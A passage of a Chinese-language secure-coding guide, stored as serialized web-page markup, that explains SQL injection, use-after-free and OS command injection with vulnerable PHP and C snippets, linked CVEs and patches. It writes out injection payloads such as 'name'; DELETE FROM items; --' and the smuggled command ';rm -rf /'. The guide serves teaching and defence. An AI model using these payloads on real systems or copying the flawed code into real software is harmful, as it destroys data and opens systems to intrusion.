function\\\"\u003ehtmlspecialchars\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token variable\\\"\u003e$type\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token string single-quoted-string\\\"\u003e'\u0026lt;bdo dir=\\\"ltr\\\"\u003e\u0026lt;/bdo\u003e\u0026lt;/td\u003e'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$current_size = $_COOKIE['pma_fontsize'];\\n$current_size = htmlspecialchars($_COOKIE['pma_fontsize']);\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$current_size\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_COOKIE\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'pma_fontsize'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$current_size\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003ehtmlspecialchars\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token variable\\\"\u003e$_COOKIE\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'pma_fontsize'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/89.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"SQL注入，如果用户可控的输入没有被正确的过滤其中可能包含的SQL语法，那么用这部分输入作为完整SQL命令的一部分时，可能发生预期之外的结果。这可用于更改查询逻辑以绕过安全检查，或插入修改后端数据库的其他语句，包括执行系统命令。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果一个SQL由用户输入拼接而成，最终的大致示意如下，其中\u003ccode class=\\\"x-inline-highlight\\\"\u003euserName\u003c/code\u003e是用户名，\u003ccode class=\\\"x-inline-highlight\\\"\u003eitemName\u003c/code\u003e由用户输入：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT * FROM items WHERE owner = \u003cuserName\u003e AND itemname = \u003citemName\u003e;\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"SELECT * FROM items WHERE owner = \u0026lt;userName\u003e AND itemname = \u0026lt;itemName\u003e;\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"此时如果用户名\u003ccode class=\\\"x-inline-highlight\\\"\u003ewiley\u003c/code\u003e输入的\u003ccode class=\\\"x-inline-highlight\\\"\u003eitemName\u003c/code\u003e是\u003ccode class=\\\"x-inline-highlight\\\"\u003ename' OR 'a'='a\u003c/code\u003e，则拼接后的SQL语句是：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e items \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e owner \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'wiley'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003eAND\u003c/span\u003e itemname \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'name'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003eOR\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'a'\u003c/span\u003e\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'a'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这条语句等价于：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT * FROM items;\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e items\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"还是上面的例子，这次假设用户\u003ccode class=\\\"x-inline-highlight\\\"\u003ewiley\u003c/code\u003e输入的\u003ccode class=\\\"x-inline-highlight\\\"\u003eitemName\u003c/code\u003e是\u003ccode class=\\\"x-inline-highlight\\\"\u003ename'; DELETE FROM items; --\u003c/code\u003e，则SQL语句等价于下面的两个请求：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';\\nDELETE FROM items;\\n--'\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e items \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e owner \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'wiley'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003eAND\u003c/span\u003e itemname \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'name'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token keyword\\\"\u003eDELETE\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e items\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token comment\\\"\u003e--'\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 3\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$id = $_COOKIE[\\\"mid\\\"];\\nmysql_query(\\\"SELECT MessageID, Subject FROM messages WHERE MessageID = '$id'\\\");\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_COOKIE\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"mid\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token function\\\"\u003emysql_query\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"SELECT MessageID, Subject FROM messages WHERE MessageID = '\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e\u003c/span\u003e'\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"由于cookie是可以在本地修改的，这仍然是一个输入用户可控的例子。注意到PHP语句中的单引号包裹着\u003ccode class=\\\"x-inline-highlight\\\"\u003e$id\u003c/code\u003e，一个可以注入的载荷是\u003ccode class=\\\"x-inline-highlight\\\"\u003e1432' or '1' = '1\u003c/code\u003e。请求会变成：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eSELECT\u003c/span\u003e MessageID\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e Subject \u003cspan class=\\\"token keyword\\\"\u003eFROM\u003c/span\u003e messages \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e MessageID \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'1432'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003eor\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'1'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e'1'\u003c/span\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2018-1000869\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2018-1000869\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://github.com/phpipam/phpipam/issues/2344\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/phpipam/phpipam/issues/2344\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/phpipam/phpipam/commit/856b10ca85a24c04ed8651f4e13f867ec78a353d\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/phpipam/phpipam/commit/856b10ca85a24c04ed8651f4e13f867ec78a353d\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"补丁中加入对参数合法性的检验：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$nat_id   = $_POST['id'];               // nat id\\n$nat_type = $_POST['type'];             // src, dst\\n\\n// validate object type\\nif (!in_array($obj_type, ['subnets', 'ipaddresses'])) { $Result-\u003eshow(\\\"danger\\\", _(\\\"Invalid object type\\\"), true); }\\n\\n// validate object id\\nif (!is_numeric($obj_id)) { $Result-\u003eshow(\\\"danger\\\", _(\\\"Invalid object id\\\"), true); }\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 96px, var(--bg-transparent-green) 96px 216px, transparent 216px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1a\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/416.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【V】CWE-416: Use After Free\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"使用释放过的指针可能会导致未知的行为发生。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"#include \u003cstdio.h\u003e\\n#include \u003cunistd.h\u003e\\n#define BUFSIZER1 512\\n#define BUFSIZER2 ((BUFSIZER1 / 2) - 8)\\nint main(int argc, char **argv)\\n{\\n    char *buf1R1;\\n    char *buf2R1;\\n    char *buf2R2;\\n    char *buf3R2;\\n    buf1R1 = (char *)malloc(BUFSIZER1);\\n    buf2R1 = (char *)malloc(BUFSIZER1);\\n    free(buf2R1);\\n    buf2R2 = (char *)malloc(BUFSIZER2);\\n    buf3R2 = (char *)malloc(BUFSIZER2);\\n    strncpy(buf2R1, argv[1], BUFSIZER1 - 1);\\n    free(buf1R1);\\n    free(buf2R2);\\n    free(buf3R2);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1b\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ebuf2R1\u003c/code\u003e已经被释放过了。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"char *ptr = (char *)malloc(SIZE);\\nif (err)\\n{\\n    abrt = 1;\\n    free(ptr);\\n}\\n...\\nif (abrt)\\n{\\n    logError(\\\"operation aborted before commit\\\", ptr);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1c\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在发生异常时指针已经释放，但随后又在\u003ccode class=\\\"x-inline-highlight\\\"\u003elogError\u003c/code\u003e错误地使用。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2018-1000217\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2018-1000217\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://github.com/DaveGamble/cJSON/issues/248\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/DaveGamble/cJSON/issues/248\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/FSMaxB/cJSON/commit/22a7d04fa004462e0dca35c3cc7809bea38e65f9\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果\u003ccode class=\\\"x-inline-highlight\\\"\u003eitem\u003c/code\u003e的\u003ccode class=\\\"x-inline-highlight\\\"\u003estring\u003c/code\u003e属性恰好就是\u003ccode class=\\\"x-inline-highlight\\\"\u003eadd_item_to_object\u003c/code\u003e的\u003ccode class=\\\"x-inline-highlight\\\"\u003estring\u003c/code\u003e参数的地址，且\u003ccode class=\\\"x-inline-highlight\\\"\u003econstant\u003c/code\u003e为\u003ccode class=\\\"x-inline-highlight\\\"\u003efalse\u003c/code\u003e，\u003ccode class=\\\"x-inline-highlight\\\"\u003ecJSON_strdup\u003c/code\u003e会在释放后访问这个字符串。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$1d\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 72px, var(--bg-transparent-green) 72px 144px, transparent 144px, transparent 264px, var(--bg-transparent-red) 264px 384px, transparent 384px, transparent 432px, var(--bg-transparent-red) 432px 480px, transparent 480px, transparent 480px, var(--bg-transparent-green) 480px 528px, transparent 528px, transparent 600px, var(--bg-transparent-red) 600px 648px, transparent 648px, transparent 648px, var(--bg-transparent-green) 648px 696px, transparent 696px, transparent 792px, var(--bg-transparent-red) 792px 840px, transparent 840px, transparent 840px, var(--bg-transparent-green) 840px 864px, transparent 864px, transparent 912px, var(--bg-transparent-green) 912px 1104px, transparent 1104px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$1e\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/78.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"操作系统命令注入，类似地，只不过此时是操作系统命令。通常这有两种子类型：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"程序执行某个固定的程序，但是接收外部输入作为程序的参数。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"程序将整个输入作为命令重定向到操作系统。\"}}]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$userName = $_POST[\\\"user\\\"];\\n$command = 'ls -l /home/' . $userName;\\nsystem($command);\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$userName\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$_POST\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"user\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$command\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string single-quoted-string\\\"\u003e'ls -l /home/'\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e.\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$userName\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token function\\\"\u003esystem\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token variable\\\"\u003e$command\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果缺乏相应的认证，攻击者可以通过命令分隔符执行攻击命令，例如参数传入\u003ccode class=\\\"x-inline-highlight\\\"\u003e;rm -rf /\u003c/code\u003e，命令就等价于：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Bash\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"ls -l /home/;rm -rf /\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token function\\\"\u003els\u003c/span\u003e \u003cspan class=\\\"token parameter variable\\\"\u003e-l\u003c/span\u003e /home/\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\u003cspan class=\\\"token function\\\"\u003erm\u003c/span\u003e \u003cspan class=\\\"token parameter variable\\\"\u003e-rf\u003c/span\u003e /\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2019-1010200\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2019-1010200\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003epatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/google/voice-builder/commit/c145d4604df67e6fc625992412eef0bf9a85e26b\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" 